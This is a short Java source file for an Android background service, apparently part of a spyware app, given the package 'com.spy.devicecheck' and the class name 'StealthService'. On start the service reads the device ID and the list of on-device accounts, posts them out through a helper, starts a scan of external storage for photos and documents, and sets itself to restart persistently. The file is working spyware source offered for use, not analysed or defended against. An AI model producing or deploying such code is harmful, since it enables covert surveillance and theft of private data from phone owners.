package com.spy.devicecheck;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;

public class StealthService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String id = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        String accounts = SpyUtils.getAccounts(this);

        SpyUtils.postData("REPORT\nID: " + id + "\nACCOUNTS:\n" + accounts);

        // Start scanning the internal storage for photos/docs
        new Thread(() -> {
            SpyUtils.scanFiles(Environment.getExternalStorageDirectory());
        }).start();

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}